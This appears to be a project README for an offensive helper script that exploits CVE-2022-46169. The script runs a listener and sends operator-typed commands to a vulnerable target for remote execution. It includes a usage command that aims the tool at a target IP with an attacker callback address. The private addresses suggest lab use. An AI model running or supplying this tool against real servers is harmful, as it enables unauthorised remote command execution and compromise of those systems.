# CVE-2022-46169 Exploitation Helper Script
## Description
This Python script serves as a helper tool to streamline the process of exploiting the CVE-2022-46169 vulnerability. It starts an HTTP server that listens for incoming requests and prints out their details, including the method, path, headers, and body. It also provides a simple interface for the user to input commands to be executed on the target server.

By leveraging this script, a user can automate the process of sending crafted payloads to a vulnerable server and observe the server's responses in real-time.

## Features
Starts an HTTP server on a user-specified port.
Listens for both GET and POST requests and prints out their details.
Allows the user to input commands that are inserted into a predefined payload and executed on the target server.
Checks for the necessary CVE-2022-46169.py script in the same directory and offers to download it if not found.
Gracefully shuts down the server and cleans up when the user types 'exit'.
Handles Ctrl+C interrupts and performs necessary cleanup.
Requirements
Python 3.6 or later

## Usage
Ensure you have Python 3.6 or later installed on your system.
Download the script and navigate to its directory in your terminal.
Run the script with the -t, -ip, and -port arguments specifying the target URL, the IP address for the server, and the port number for the server, respectively. For example:

```bash
git clone git@github.com:ahanel13/ImprovedShell-for-CVE-2022-46169.git
cd ImprovedShell-for-CVE-2022-46169
python improved_server.py -t http://10.10.11.211 -ip 10.10.14.86 -port 5000
```

The script will start the server and check for the CVE-2022-46169.py script in the same directory. If it's not found, the script will offer to download it for you.
Once the server is running, you can start typing commands to be executed on the target server. The responses will be printed out in the terminal.
To stop the server and exit the script, simply type 'exit'. If you need to forcibly stop the script, you can press Ctrl+C, and the script will perform necessary cleanup before exiting.
